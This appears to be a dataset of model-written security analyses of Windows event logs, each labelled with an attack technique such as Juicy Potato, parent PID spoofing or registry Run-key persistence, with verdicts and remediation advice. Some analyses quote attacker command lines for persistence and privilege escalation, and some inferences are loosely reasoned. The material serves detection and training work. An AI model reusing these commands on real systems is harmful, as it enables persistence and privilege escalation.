     ```
     This indicates a potential service hijacking technique, often used for persistence or malicious code execution.
  
2. **Service Control Manager (System Log):**
   - The failed start of the `Fax` service due to a timeout (`%%1053`) which aligns with the suspicious service configuration in the Sysmon logs.

3. **Security Log:**
   - Event `4616` suggests time changes which might point to tampering, but it seems related to `svchost.exe` which handles legitimate Windows services activities.

4. **Application Logs:**
   - Multiple entries regarding the stopping of `edgeupdate` service, correlates with observed Sysmon logs, possibly routine update activities for Microsoft Edge.

### Assessment:

- **Suspicious Behavior:**
  - The reconfiguration of the `Fax` service to execute PowerShell commands is a significant indicator of potentially malicious activity. This method is a known technique for privilege escalation or persistence within compromised systems.
  - The `cmd.exe` activity tied to service configuration with PowerShell makes it a prime suspect in malicious orchestration.
  - `whoami.exe`, `hostname.exe`, and frequent usage of `conhost.exe` might be routine system inquiries but provide context within potentially malicious scripts or exploitation frameworks.

### Resolution:
- **MALICIOUS**: The evident change in service configuration and invocation of PowerShell suggest unauthorized and potentially harmful activity. The `cmd.exe` used to configure the `Fax` service is a known adversary technique for executing code with higher privileges or maintaining persistence.

### Guidance:
- **Immediate Steps:**
  - Isolate the affected system to prevent further potential malicious activities.
  - Investigate the timeline of changes to the service configuration and correlate with user activities.
  - Analyze possible sources of the script or files injected into the system.
  - Check for other anomalous services or scheduled tasks created or modified around the same timeframe.
  
- **Further Actions:**
  - Review and apply necessary patches or updates for Windows and antivirus software.
  - Conduct a wider threat hunt across the network for similar indicators.
  - Educate users on recognizing phishing attempts or suspicious links that may lead to such compromises.

These steps will help to ensure that the system and the network environment are secured against similar threats."
Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively),"In my analysis of the provided Windows event logs, several indicators suggest potentially malicious activity. Here's a breakdown of the findings:

### Key Observations:

1. **Suspicious PowerShell Execution:**
   - The PowerShell logs contain instances where `werfault.exe` is being started via PowerShell (`Start-Process C:\Windows\System32\werfault.exe -passthru`) and subsequently, an executable named `CreateRemoteThreadNative.exe` is being executed with the `-pid` parameter. This behavior aligns with techniques used for process injection and may indicate an attempt to execute malicious code in the context of `werfault.exe`.

2. **Process and PowerShell Integrity Levels:**
   - The Sysmon logs show high integrity level for PowerShell execution (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`). This could mean that the PowerShell sessions are being escalated to administrative privileges, which is common in cases of privilege escalation attempts.

3. **Abnormal Activity in Temp Directory:**
   - The PowerShell and Sysmon logs reference executables in a temporary directory `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64`. Temp directories are commonly used by malware for staging malicious payloads or scripts.

4. **Privilege Escalation:**
   - The Security logs contain Event ID 4672, showing special privileges were assigned to the user `admin_test` (including `SeDebugPrivilege`). This is concerning, as these privileges can be exploited to bypass process permissions and execute native code.

5. **Time Change Events:**
   - The Security and System logs indicate time changes (Event ID 4616 and Kernel-General Event ID 1), which can be a tactic used by attackers to evade detection or bypass logging. The frequent time adjustments are unusual and merit further investigation.

6. **Use of Native Tools in Suspicious Context:**
   - `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are executed in close conjunction with abnormal PowerShell activity. This could indicate attempts to gather user or system information and potentially clear or tamper with event logs.

7. **Network Activity:**
   - The Security logs show network logon attempts (Logon Type 3) from `DESKTOP-3HL5B2P` to `SERVER002` using NTLM. While not definitively malicious, the context of the other log events raises the possibility of unauthorized access attempts.

### Assessment:

Based on these observations, the dominant indicators involve suspicious PowerShell execution behavior, abuse of privileges, time manipulation, and execution of processes within a temporary folder—all of which align with tactics used in various stages of a cyber attack.

### Resolution:

- **MALICIOUS:** There are strong signs of potentially malicious activity within these logs. The execution of suspicious code via PowerShell, possible privilege escalation, unauthorized network logon attempts, and manipulation of system time are collectively indicative of a compromise.

### Recommended Actions:

1. **Isolate the Affected System:** Immediately isolate `Server002` from the network to prevent further propagation of the potential threat.
   
2. **Incident Response:** Engage your incident response team to perform a deeper forensic analysis of `Server002`. This should include memory analysis, file system review for unauthorized changes, and examining network activity logs.

3. **Review and Revoke Privileges:** Assess and review all accounts with privileged access on the network, especially the `admin_test` account. Revoke unnecessary privileges.

4. **Security Patches and Updates:** Ensure all systems are patched with the latest security updates, and review patch management processes to prevent future vulnerabilities.

5. **Monitor and Audit:** Set up telemetry for continuous monitoring of PowerShell usage and critical changes. Use advanced threat detection solutions to improve malicious activity recognition.

6. **User Awareness Training:** Conduct security awareness training focused on recognizing phishing and social engineering tactics that are often precursors to such activities.

These proactive steps should mitigate the immediate threat and strengthen the security posture against potential future incursions."
Leverage Virtual Channels to execute custom DLL during successful RDP session,"### Analysis of Windows Event Logs

Upon review of the provided logs from different sources (System, Application, and Sysmon), the following observations were made:

#### Key Observations:

1. **Time Adjustments:**
   - Multiple instances of the `Microsoft-Windows-Kernel-General` Event ID 1 indicate minor time adjustments by the `svchost.exe` process. This could be part of normal time synchronization with NTP servers like `time.windows.com`. There are no unusual timestamps that would raise immediate concerns.

2. **Service Stoppage:**
   - `edgeupdate` service has stopped according to the Application log. This could be a scheduled or routine update; however, no specific indication of malicious activity is directly tied to this.

3. **Process Creation and Execution:**
   - A series of processes originating from `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and others like `svchost.exe` are recorded. These processes appear consistent with routine operations and do not inherently indicate malicious activity.
   - The use of `reg.exe` to modify the registry could be suspicious if the intent was unauthorized modification. The registry key addition related to a potential malware addin hints at an attempt to persist malicious software.

4. **Sysmon Logs:**
   - Sysmon log entries detail processes with high integrity levels executed by the user `admin_test`. There is a clear chain of process executions involving legitimate Microsoft utilities.
   - A noteworthy point is the command line used in `cmd.exe` to add a registry entry, indicating potential tampering or malware persistence attempt:  
     ```cmd
     ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\Malware"" /v Name /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f
     ```
   - The above command suggests suspicious behavior, possibly indicating an attempt to disable AMSI (Antimalware Scan Interface).

5. **EdgeUpdate Activity:**
   - There is considerable activity from Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup.exe`). This may be part of a legitimate software update sequence. However, the presence of multiple update-related executions in a short time span could suggest an anomaly if not scheduled.

#### Assessment:

- While the logs contain entries indicative of routine system behavior like edge updates and service activities, the `cmd.exe` command adding a registry entry associated with a potential malware addin is highly suspicious.
- Given the observed registry modification targeting AMSI, a known tactic by malware to avoid detection, a deeper investigation is warranted to confirm or rule out inadvertent or unauthorized registry changes.

### Conclusion:

After evaluating the event logs provided:

- **Resolution: SUSPICIOUS**

The activity surrounding the unauthorized registry modifications strongly suggests suspicious behavior that needs further investigation. It is essential to verify the intent and authenticity of the changes and assess if the system integrity has been compromised or if malware persistence techniques are in play.

### Guidance:

1. **Immediate Steps:**
   - Isolate the affected host to prevent potential lateral movement across the network.
   - Examine the integrity of `amsi.dll` and look for unauthorized modifications or replacements.
   - Investigate the source and intent of the registry change command and verify the user `admin_test` activities during the logged period.

2. **Further Actions:**
   - Conduct a comprehensive malware scan and review logs from other security solutions like EDR if deployed.
   - Perform a detailed review of user activities leading to and following the suspicious log entries.
   - Restore the registry to a known good state if deemed necessary and ensure AMSI functionality is intact. 

This approach will help ensure that the system security posture is not adversely affected by any potential malicious activity."
HKLM - Policy Settings Explorer Run Key,"### Analysis

#### Indicator 1: Process Execution
- **Processes Observed:**
  - `wevtutil.exe`
  - `conhost.exe`
  - `hostname.exe`
  - `whoami.exe`
  - `powershell.exe`
- **Observation:** The frequent execution of `wevtutil.exe`, a command-line utility to manage events and event logs, at such a rapid pace can be suspicious if this activity does not align with normal operational tasks or scheduled administrative scripts. `conhost.exe` runs alongside command-line applications and is generally benign. However, its association with other suspicious activity should be considered.

#### Indicator 2: PowerShell Command
- **Command Line:** `powershell.exe` & {if (!(Test-Path -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){New-Item -ItemType Key -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""}Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""filetest"" -Value ""C:\Windows\System32\calc.exe""}`
- **Observation:** This PowerShell script attempts to create a registry key that runs `calc.exe` automatically. This behavior indicates a possible persistence mechanism, which is a common tactic used by malware to ensure it runs each time the system starts. The use of `WindowsPowerShell` with administrative privileges (i.e., High Integrity Level) to modify registry keys adds to the suspicion.

#### Indicator 3: Privilege Escalation and User Accounts
- **User Account:** `SERVER002\admin_test`
- **Security Events:**
  - Privileges including `SeDebugPrivilege`, `SeBackupPrivilege`, etc., were granted to `admin_test`, indicating a high level of permissions. Such privileges are often targeted during privilege escalation attacks.
- **Logon Events:** Multiple logon events of `admin_test` through NTLM, indicating the use of potential administrative sessions.

#### Indicator 4: Time Discrepancy in Kernel Events
- **Events:** Kernel-General and Time-Service events indicating minor time adjustments in the system clock. While small changes are often benign, when coupled with other suspicious activity, they could indicate attempts to bypass authentication logs or other time-dependent security measures.

### Conclusion
The combination of suspicious PowerShell activity, potential persistence through registry modifications, high-level privileges granted to an administrative user, and the unusual use of system utilities like `wevtutil.exe` suggests potential malicious activity on `Server002`.

- **Resolution:** **MALICIOUS**

### Recommended Actions
1. **Isolate the Machine:** Immediately isolate the affected system from the network to prevent further potential spread or data exfiltration.
2. **Registry Inspection and Clean-up:** Investigate the registry modifications and remove unauthorized entries.
3. **Review User Activities:** Perform a thorough review of `admin_test` user activities, and consider resetting passwords and reviewing access controls.
4. **Full Forensic Analysis:** Conduct a more comprehensive forensic investigation to determine the scope of the compromise, including timeline reconstruction and search for additional indicators of compromise (IOCs).

6. **Patch and Secure:** Ensure the system is up to date with the latest security patches and enhance the endpoint protection mechanisms to detect similar anomalies in the future."
Snake Malware Kernel Driver Comadmin,"### Detailed Analysis

1. **PowerShell Log Analysis:**
   - The PowerShell events show the execution of a script designed to create a directory in the system directory `C:\Windows\System32\Com` and write a file `comadmin.dat` with random bytes. This script runs PowerShell with `powershell.exe & {$examplePath...}`.
   - Creating files with seemingly random content in system directories is often associated with malicious activities, such as persistence mechanisms, data exfiltration, or preparation for later stages of a compromise (e.g., creating files that might serve as markers or mislead detection systems).

2. **Application Log Analysis:**
   - The ""edgeupdate"" service logs indicate a stop operation, which is often routine during updates. However, in this context, it should be correlated with other logged activities to ensure no malicious alteration.

3. **Sysmon Log Analysis:**
   - A notable number of events are related to `wevtutil.exe`, `conhost.exe`, and various PowerShell executions. The use of `wevtutil.exe` might be benign or indicative of an attacker clearing event logs to cover traces.
   - The presence of multiple `conhost.exe` events suggests the management of command-line based activities, which might appear in chains when scripts are executed.
   - The PowerShell execution observed in Sysmon logs corroborates with what was found in the PowerShell logs, showing execution from a high integrity level, suggesting privileged execution, which raises concerns about unauthorized administrative access.

4. **Process Creation:**
   - Frequent and tightly spaced process creation events, especially involving tools commonly used by attackers (`wevtutil.exe`, `powershell.exe`), might suggest automated or deliberate manual actions.
   - The benign `whoami.exe` and `hostname.exe` executions can be used by scripts or attackers testing and verifying their access.

5. **Edge Update Activity:**
   - Multiple entries for Microsoft Edge Update processes, `MicrosoftEdgeUpdate.exe`, and related sub-processes appear legitimate as system or third-party applications often update regularly. However, such processes can also be leveraged for privilege escalation or to execute rogue code using trusted binaries.

### Assessment
Based on the analysis of the logs provided, there are several indicators suggesting potentially malicious behavior:
- **Use of PowerShell** for custom script execution to create files in system directories, noted for its association with attacks involving lateral movement or staging.
- **High-frequency use of `wevtutil.exe`**, possibly indicating log tampering.

### Conclusion
The findings from the PowerShell logs and the suspicious usage of Windows utilities suggest activities that should not be part of typical administrative tasks, particularly on a server computer.

**Resolution: SUSPICIOUS**

### Recommendations:
1. **Immediate Investigation**: Further examine the host for unauthorized or suspicious scripts, scheduled tasks, and recently modified files or directories.
2. **Containment**: If the server is suspected of being compromised, isolate it from the network to prevent further spread or data exfiltration.
3. **Review and Enhance Monitoring**: Strengthen logging and monitoring for unauthorized use of PowerShell and other system-level binaries.
4. **Audit User Activity**: Review admin user activity, `admin_test`, for patterns indicative of compromised accounts.
5. **Telemetry Data and Forensic Analysis**: Collect additional telemetry data and perform a forensic analysis on the server (e.g., memory dump analysis, searching for additional IoCs)."
Parent PID Spoofing - Spawn from Current Process,"Upon analyzing the provided event logs from the Windows host, here is a detailed assessment of the situation:

### PowerShell Logs Analysis:
- **PowerShell Execution**: The logs show the execution of `powershell.exe` with a specific command:
  ```
  powershell.exe & {Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID}
  ```
  This represents an attempt to start a PowerShell process with a delay (`Start-Sleep 10`) under a specific parent process.

### System Logs Analysis:
- **Windows Update Activity**: The logs from the System Channel indicate that various Windows updates were being processed. This is typical and expected behavior for a Windows system to ensure up-to-date security patches and features.

### Sysmon Logs Analysis:
- **Process Creation**: Several Sysmon Event ID 1 entries show process creation events, such as `powershell.exe`, `whoami.exe`, and host-related processes like `svchost.exe`. These are standard processes on a Windows system.
- **Wevtutil**: There are multiple entries for `wevtutil.exe`, which is used to manage event logs. If not typically used by admin or automation scripts, this could signal suspicious behavior, especially when coupled with other abnormal activities.

### Security Logs Analysis:
- **Authentication Events**: A logon event with Event ID 4624 shows a successful system logon with elevated privileges (`SYSTEM`) which is a standard operation within system context.
- **Privileges Granted**: The Event ID 4672 shows typical privileges granted to the `SYSTEM` account, which includes high-level permissions like `SeDebugPrivilege`. 

### Application Logs Analysis:
- **Application Event**: The application log contains an entry for the Software Protection Platform, which is part of normal Windows operation related to license validation and system integrity checks.

### Indicators of Suspicious Activity:
- **PowerShell Script**: The use of a PowerShell script with the command `Start-ATHProcessUnderSpecificParent` and a sleep command is unusual. Attackers often utilize sleep commands to delay execution, potentially as part of evasion techniques or staged payloads.
- **Wevtutil Usage**: Multiple executions of `wevtutil.exe` without a clear administrative task or log management reason can be suspicious, as attackers may use this tool to clean or manage event logs to hide their tracks.

### Resolution:
Based on the current evidence, the activity noted within the logs is characterized by an unusual PowerShell script execution and the unusual usage of `wevtutil.exe`. However, without additional context or potential alerts regarding user-reported issues, these could be part of a legitimate administrative task or automation script.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
1. **Further Investigation**:
   - **Contextual Inquiry**: Investigate the origin and purpose of the `Start-ATHProcessUnderSpecificParent` PowerShell script. Determine if it's part of any legitimate administrative task or script.
   - **Review Log Management Practices**: Ensure that the usage of `wevtutil.exe` was authorized and part of a known administrative operation.
   - **Monitor for Anomalies**: Keep an eye on any unusual activity on the server, including any unauthorized access or privilege escalation attempts.
   
2. **Implement Monitoring**:
   - Deploy enhanced logging and alerting mechanisms to quickly identify any re-occurrence of similar patterns or potential malicious scripts being executed.
   
3. **Security Hygiene**:
   - Ensure all systems are up to date with the latest security patches and conduct regular security training to empower users to detect suspicious activities. 

Further investigation is recommended to determine the nature and source of the PowerShell commands and verify if the use of `wevtutil.exe` aligns with normal operational practices."
Access Token Manipulation,"After careful analysis of the provided Sysmon, System, PowerShell, Application, and Security logs, the following observations and assessments are made:

1. **Sysmon Logs**:
    - The logs show standard activity involving Microsoft Edge Update and regular Windows processes (e.g., `HOSTNAME.EXE`, `conhost.exe`, and `whoami.exe`). 
    - A PowerShell command was executed with a `Set-ExecutionPolicy -Scope Process Bypass -Force`, indicating someone is modifying the script execution policy temporarily. This is often used in legitimate administrative tasks but can also be used maliciously.
    - A PowerShell script from a temporary directory (`\\TEMP\\file\\data.002\\src\\GetToken.ps1`) is executed, and attempts to create a process from `lsass` using `cmd.exe`. This behavior is alarming as it could suggest credential dumping or a privilege escalation attempt.

2. **System Logs**:
    - The system logs primarily contain time adjustments and the usual service operations, which don't raise any direct red flags for malicious activity.

3. **PowerShell Logs**:
    - The execution of `GetToken.ps1` and accompanying processes suggest a potential attempt to extract sensitive information, which corroborates with the suspicious PowerShell activity observed in the Sysmon logs.

4. **Application Logs**:
    - Logs mainly revolve around the routine update processes for Microsoft Edge. No anomalous activity is identified here beyond normal service stops and starts.

5. **Security Logs**:
    - Logs show time changes logged by the LOCAL SERVICE, typically indicating synchronization events which by themselves don't appear malicious.

**Assessment:**
The execution of PowerShell from a temporary directory, especially with commands attempting to interact with `lsass`, combined with the use of `Set-ExecutionPolicy -Scope Process Bypass -Force`, strongly suggests suspicious behavior that could be malicious in nature. Activities like this could aim at credential dumping which is often an indication of a potential security breach.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a detailed forensic analysis of the `GetToken.ps1` script to determine its intended functionality and origin.
- Verify system integrity by scanning for unwanted or malicious installations that could coincide with the execution timestamp.
- Consider an in-depth review of recent password and credential changes for anomalies or unauthorized accesses.
- Ensure that the system's PowerShell execution policy is reverted to its secure settings and investigate who/what changed it.
- Monitor for additional unusual PowerShell activities across the network and ensure logging is sufficient to trace back to potential sources.
- If suspicion increases after analysis or if additional context is uncovered, isolation of the system and incident response processes may need to be initiated."
HKLM - Modify default System Shell - Winlogon Shell KEY Value,"Upon reviewing the provided Windows event logs, several aspects suggest potential indicators of suspicious or malicious activity:

1. **PowerShell Activity:**
   - The PowerShell commands involved registry modifications to the Winlogon Shell. The script extracts the current Shell value, creates a backup, and appends a new executable to execute (`C:\Windows\explorer.exe`). This kind of registry modification is commonly associated with persistence mechanisms used by malware to persist through system restarts. The use of PowerShell to alter registry values in this manner, especially relating to startup parameters, is generally regarded as suspicious.

2. **User Activity:**
   - The `admin_test` account was involved in executing several processes, including `wevtutil.exe`, `conhost.exe`, and `powershell.exe` with elevated privileges. The enumeration of users (`whoami` command) is also indicative of privilege reconnaissance. The elevated privileges (notably `SeDebugPrivilege`, `SeBackupPrivilege`, etc.) assigned to `admin_test` could potentially facilitate privilege escalation or further unwanted access.

3. **Sysmon Logs:**
   - Multiple instances of the `Sysmon` event indicate process creation and modification activities, particularly involving `MicrosoftEdgeUpdate.exe`. The frequent operations conducted by `MicrosoftEdgeUpdate.exe` with system privileges are notable, but in the context of legitimate software updates, it may be benign. However, if these activities are unexpected based on your update schedule, they should be scrutinized.

4. **Security Logs:**
   - Log entries show successful logon attempts using NTLM with non-standard workstation names. The elevated token usage indicates these sessions ran with administrative privileges, warranting further access review for any unauthorized privilege access.

5. **Time Discrepancies in Security and System Logs:**
   - There seem to be repeated alterations to system time settings reported in the Security and System logs. While this might align with legitimate system maintenance tasks, unauthorized time changes can be used to erase traces of malicious activity within timestamped logs.

**Conclusion and Guidance:**
- **Resolution:** **SUSPICIOUS**

The investigation indicates behaviors characteristic of suspicious and potentially malicious activity. Despite the presence of legitimate processes, unusual PowerShell usage and registry modifications, elevated privileges for a specific user account, and irregular log events suggest further investigation is warranted.

**Actionable Steps:**
1. **Containment and Review**: Engage with the user (`admin_test`) responsible for elevated activities and review logs around their session for unauthorized actions.
2. **Registry and Startup Inspection**: Validate the registry changes made by PowerShell and revert any unauthorized configuration changes.
3. **Privilege Audit**: Conduct a comprehensive audit of `admin_test` and other privileged accounts to ensure permissions conform to least privilege principles.
4. **Monitor for Persistence**: Use EDR/XDR solutions to monitor for persistence mechanisms similar to those exhibited.
5. **Analyze Network Activity**: Cross-reference user login and process invocation times with network logs to identify any unexpected data exfiltration or command-and-control activities."
Parent PID Spoofing using PowerShell,"### Detailed Analysis:

#### Security Log Analysis:
1. **Event ID 4624**: This event shows a logon attempt, specifically with LogonType 5, which indicates a service logon. The logon as System (NT AUTHORITY\SYSTEM) by processes `C:\Windows\System32\services.exe` and `C:\Windows\System32\taskhostw.exe` is typical of Windows services, common in benign scenarios.
   
2. **Event ID 4672**: Shows privileged logon rights for the `SYSTEM` account. The privileges listed are typical for system-level operations. However, it includes `SeDebugPrivilege`, which if used maliciously, could allow someone to perform sensitive operations.

3. **Event ID 5379**: Indicates unsuccessful credential handling attempts related to Microsoft account operations. While multiple instances are recorded, they consistently fail, suggesting potential misconfiguration or connectivity issues rather than malicious activity.

4. **Event ID 4798**: Indicates attempts to enumerate Security Identifiers (SIDs) for user accounts. The involved process `taskhostw.exe` is commonly used by legitimate Windows operations; however, repeated attempts could suggest reconnaissance activities.

#### Sysmon Log Analysis:
1. Multiple events showing the execution of `powershell.exe`, `wevtutil.exe`, and `conhost.exe` by the user `SERVER002\admin_test`. Notably, PowerShell is invoked with a potentially suspicious script: `PPID-Spoof.ps1`, designed to manipulate Parent Process IDs, commonly used by malware to evade detection.

2. The command line in PowerShell activity indicates manipulation of processes with specific parent process identifiers (PPID), along with references to DLL injection (notably `calc.dll`). This behavior is highly suspicious due to its common use in process injection techniques by malware.

#### Windows PowerShell Log Analysis:
1. Matching activity with the suspicious PowerShell script seen in the Sysmon logs.
2. The PowerShell commands suggest an attempt to launch Internet Explorer to potentially execute a malicious DLL. The technique described is indicative of an attempt to maintain persistence or escalate privileges through process injection.

#### Application Log Analysis:
1. No direct indication of malicious activity beyond expected operations (e.g., Windows Defender being active).

### Assessment of the Situation:
- Several indicators within the logs suggest malicious activity. The activity involving `powershell.exe` and `PPID-Spoof.ps1` targeting `iexplore.exe` with a DLL are classic signs of attempted privilege escalation or lateral movement by an adversary. The use of PowerShell for such operations is a known red flag due to its capability of executing complex payloads with evasion tactics.

### Threats or Risks Identified:
- Potential for system compromise through process injection using PowerShell.
- Privileges associated with `SYSTEM` can be misused for deeper access or maintaining stealth persistence.
  
### Guidance on How to Proceed:
1. **Isolate the affected system** to prevent potential spread of infection or unauthorized access.
2. **Conduct a deeper forensic analysis** of associated processes and file executions, especially around `PowerShell` activities.
3. **Review and strengthen security policies** regarding the execution of scripts and PowerShell use. Consider application whitelisting or logging enhancements.
4. **Monitor all user accounts** involved in the suspicious activity for unusual access patterns.
5. **Use Endpoint Detection and Response (EDR) tools** for further threat hunting and broader detection capabilities.

### Resolution:
- **MALICIOUS** - The logs contain evidence of activities that strongly indicate malicious intent and actions aimed at compromising system integrity through process injection techniques."
At.exe Scheduled task,"After analyzing the provided Windows event logs across different channels (Security, Application, Sysmon, and System), the following observations and assessments can be made:

1. **Security Log Observations:**
   - Event ID 4616 involves changes to the system time, often involving `svchost.exe` under the `LOCAL SERVICE` account. This could indicate legitimate system time synchronization activities, but frequent and unrecognized changes could be suspicious if they don't align with scheduled tasks or legitimate maintenance activities.

2. **Application Log Observations:**
   - The event from the Software Protection Platform Service seems routine and doesn't immediately indicate malicious activity.

3. **Sysmon Log Observations:**
   - There is evidence of several process creations involving `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe`, executed by the `SERVER002\admin_test` account.
   - The command `cmd.exe /c at 13:20 /interactive cmd` stands out as suspicious. The use of the `at` command to schedule tasks and execute a command interface with interactive privileges is often indicative of privilege escalation or persistence mechanisms used by malicious actors. This warrants further investigation.
   - Process executions like `whoami.exe` and `hostname.exe` could be part of reconnaissance but are not harmful on their own unless followed by malicious activities.

4. **System Log Observations:**
   - Time alterations are recorded but align with the security log's `svchost.exe` operations. It implies time synchronization rather than an anomaly.

Overall, while many activities appear routine or benign, the use of the `at` command to schedule a command shell with interactive privileges raises red flags. This particular pattern is often associated with attempts to gain unauthorized control or maintain persistence on a compromised system.

**Resolution: SUSPICIOUS.**

This conclusion arises primarily from the suspicious use of the `cmd.exe` command to schedule tasks with potentially elevated privileges. Further investigation is necessary to determine the intent and context of these actions, including verifying the legitimacy of account activities, reviewing scheduled tasks, and monitoring for any further unauthorized activities. Also, check if these activities align with legitimate administrative functions or if they are signs of unauthorized access."
Domain Password Policy Check: No Lowercase Character in Password,"Upon careful analysis of the provided Windows event logs, the following observations are made:

1. **Microsoft Edge Installation and Update Activities:**
   - Logs indicate multiple events related to Microsoft Edge installation processes (`setup.exe`) being executed. These events include typical command-line arguments for installation, updates, and package management, executed by the `NT AUTHORITY\SYSTEM` user.
   - The frequent execution of `setup.exe` with various command-line arguments like `--msedge`, `--channel=stable`, `--system-level`, and `--verbose-logging`, appears to be part of the automated update or installation process for Microsoft Edge.
   - The hash values for the installer processes are consistent throughout these entries, indicating that the binaries have not been altered.

2. **Suspicious PowerShell Activity:**
   - A PowerShell script is executed by the `SERVER002\admin_test` user. The script reads and manipulates a credential file stored in the user's local app data directory.
   - The script appears to be checking if a certain password (""UPPER-LONG-SPECIAL-333"") is already stored as the user's current password. It attempts to change the Active Directory account password to this password if conditions are met.
   - There is notable logic within the script to handle error conditions, including deleting the credential file if the stored password is incorrect.

3. **Command-line Tools Executions:**
   - Standard command-line tools (`HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`, `wevtutil.exe`) executed by `SERVER002\admin_test` do not display suspicious behavior on their own, but their frequency and conjunction with the PowerShell script could be noteworthy.

4. **Absence of Security and Application Logs:**
   - Security and application log entries are notably absent, which could indicate log clearance activities or simply a lack of relevant events for the provided timeframe.

### Assessment

- **Microsoft Edge Installer Activities:** These are consistent with legitimate software update activities, typically executed by system-level processes in Windows environments. No indicators of compromise are noted in these activities.

- **PowerShell Script Execution:** The script involving credential management and Active Directory password changes is a potential risk area. While it might be part of legitimate administrative actions, it could also be indicative of credential stuffing, password manipulation, or malicious attempts to retain unauthorized access. The focus on storing and managing passwords, especially with ambiguous or sensitive terms like ""UPPER-LONG-SPECIAL-333"", is unusual.

### Final Resolution

**Resolution: SUSPICIOUS**

The presence of a PowerShell script manipulating credentials is concerning and warrants further investigation. It is advised to:
- Review any recent changes in the `admin_test` account's password history and authorization logs.
- Check if this script is part of known administrative procedures or if it correlates with unauthorized changes.
- Verify the legitimacy of the credential file management process by consulting with the responsible IT team or user.
- Strengthen monitoring of similar PowerShell activities in the future and ensure security protocols around PowerShell script execution are stringent.

Given these factors, while there's no direct evidence of malicious activity, the credential manipulation aspect is suspicious enough to merit a deeper examination."
Juicy Potato,"Upon reviewing the provided Sysmon, Application, and Windows PowerShell log entries, several potential indicators of malicious activity are observed:

1. **PowerShell Execution with Suspicious Command-Line Arguments**: 
   - Multiple entries (event 17999, event 18001, etc.) highlight the execution of `powershell.exe` with a command to run `JuicyPotato.exe`. The command line indicates privilege escalation attempts with `JuicyPotato`, a known tool for exploiting Windows COM services.
   - The script appears to attempt to run `notepad.exe` with elevated privileges using a CLSID `{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}`, which is indicative of an attempt at privilege escalation.

2. **Cmd.exe and External Tool Execution**:
   - The `cmd.exe` execution (event 18001) further confirms execution of `JuicyPotato.exe`, reinforcing the suspicion of a privilege escalation attempt. 

3. **Execution by an Admin Account (admin_test)**:
   - Various processes, including PowerShell and Windows utilities like `wevtutil.exe` and `conhost.exe`, are executed by an admin-level user (admin_test), suggesting these actions might be the initial phases of further system exploitation or reconnaissance.

4. **Utilization of System Processes for Potential Malicious Intent**:
   - `wevtutil.exe` and `PowerShell.exe` are invoked by the `admin_test` user account. The usage of `wevtutil.exe` could imply attempts to export, archive, or clear event logs to cover tracks.
   
5. **High Integrity Level**:
   - Notably, entries indicate actions being conducted under ""High"" integrity levels, suggesting elevated privileges are used during execution.

**Conclusion**:
The logs contain various activities consistent with exploitation or post-exploitation phases, particularly related to privilege escalation using a known exploit (`JuicyPotato`). The usage of administrative accounts, execution of `cmd.exe` with explicit privilege escalation techniques, and potential tampering with security logs align with malicious behaviors.

**Resolution**: **MALICIOUS**

**Recommendations**:
- Immediately initiate containment strategies to isolate the affected host (`Server002`).
- Conduct a thorough forensic analysis to determine the scope of compromise, including checking for additional backdoors or data exfiltration activities.
- Monitor and audit all administrative activities, especially those originating from the `admin_test` account.
- Review and harden security configurations to prevent future privilege escalation, such as implementing User Account Control (UAC) and patching known vulnerabilities."
Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value,"Upon analyzing the provided Windows event logs, I have identified the following pertinent information and areas of concern regarding potential malicious activity:

### Suspicious Activity:
1. **PowerShell Script Execution:**
    - The Windows PowerShell logs indicate execution of a script that copies `calc.exe` (Calculator executable) to a temporary directory and modifies a registry key related to the common startup path. This behavior is suspicious because it potentially sets the copied executable to start automatically with the system, a common tactic used by attackers to maintain persistence on a host.
    - The PowerShell command in question:
      ``` 
      powershell.exe & {New-Item -ItemType Directory -path ""$env:TMP\filetest\"" Copy-Item -path ""C:\Windows\System32\calc.exe"" -destination ""$env:TMP\filetest\"" Set-ItemProperty -Path ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Common Startup"" -Value ""$env:TMP\filetest\""}
      ```

2. **Unusual Process Activity:**
    - The Sysmon logs show a series of process executions involving `wevtutil.exe`, `conhost.exe`, and `PowerShell.exe` all run by a user `SERVER002\admin_test`. Consistent invocation of system utilities in this manner can be a sign of scripting or automation, possibly for malicious purposes, especially when combined with suspicious PowerShell use.

3. **Edge Update Processes:**
    - There are multiple entries related to `MicrosoftEdgeUpdate.exe` and its derived processes like `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`. While Microsoft Edge auto-updates involve such processes, frequency, and irregular patterns can mask unauthorized changes. However, in this context, they appear congruent with normal updates.

### Malicious Indicators:
The behavior exhibited in the PowerShell logs where an executable is moved to a startup directory stands out as a definite indication of a potential unauthorized attempt to persist after the system restarts.

### Assessment and Resolution:
Given the nature of the PowerShell script execution and its modifications to the startup settings, this activity aligns with tactics commonly employed in malware deployment and persistence configuration. This behavior is determined to be *MALICIOUS* due to:
- Unsanctioned modification of startup configuration to include a copied executable.
- Usage of scripting to automate these changes stealthily.

### Recommendations:
- **Immediate Action:** Disconnect the impacted host from the network to prevent potential spread or communication with external command and control servers.
- **Forensic Analysis:** Perform a comprehensive forensic examination of the host, focusing on PowerShell command history, file system changes, and registry modifications.
- **Remediation Steps:** Remove any suspicious registry modifications and files created by the above PowerShell commands.
